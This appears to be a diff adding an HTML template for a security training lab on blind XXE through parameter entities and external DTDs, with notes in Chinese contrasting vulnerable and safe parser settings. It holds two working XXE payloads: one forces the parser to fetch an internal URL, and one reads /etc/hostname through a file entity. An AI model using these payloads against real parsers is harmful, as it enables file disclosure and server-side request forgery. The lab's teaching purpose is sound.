@@ -1,0 +1,41 @@
+{% extends 'base.html' %}
+{% block title %}{{ lab.title }}{% endblock %}
+{% block content %}
+{% include 'shared_lab_header.html' %}
+<div class="workbench two-col wide-layout">
+  <section class="console-card">
+    <h2>参数实体盲打 / 外接 DTD</h2>
+    <pre class="code-panel">vuln：parser load_dtd=True，% 参数实体可引用外部 DTD，
+   解析器会主动出站（intranet:7001）。即便 XML body 没有正常输出，
+   只要外部资源被拉取就证明 XXE 成立。
+safe：load_dtd=False + resolve_entities=False，外接 DTD 直接拒绝。
+
+PoC 1（外接 DTD，让解析器主动出站）：
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [
+  &lt;!ENTITY % remote SYSTEM "http://intranet:7001/public/card"&gt;
+  %remote;
+]&gt;
+&lt;root&gt;ping&lt;/root&gt;
+
+PoC 2（参数实体 + 文件读取叠加）：
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [
+  &lt;!ENTITY % file SYSTEM "file://{{ '/etc/hostname' }}"&gt;
+  &lt;!ENTITY % wrap "&lt;!ENTITY hostname '%file;'&gt;"&gt;
+  %wrap;
+]&gt;
+&lt;root&gt;&amp;hostname;&lt;/root&gt;</pre>
+    <form method="post" action="?mode={{ mode }}" class="form-grid">
+      <label>XML
+        <textarea name="xml_text" rows="10" style="width:100%; font-family:monospace">{{ xml_text }}</textarea>
+      </label>
+      <button class="button-primary" type="submit">解析</button>
+    </form>
+    {% if output is not none %}<h3>parsed</h3><pre class="code-panel">{{ output }}</pre>{% endif %}
+    {% if parser_log %}<div class="result-banner success">{{ parser_log }}</div>{% endif %}
+    {% if error %}<pre class="error-box">{{ error }}</pre>{% endif %}
+  </section>
+</div>
+{% include 'shared_hints.html' %}
+{% endblock %}
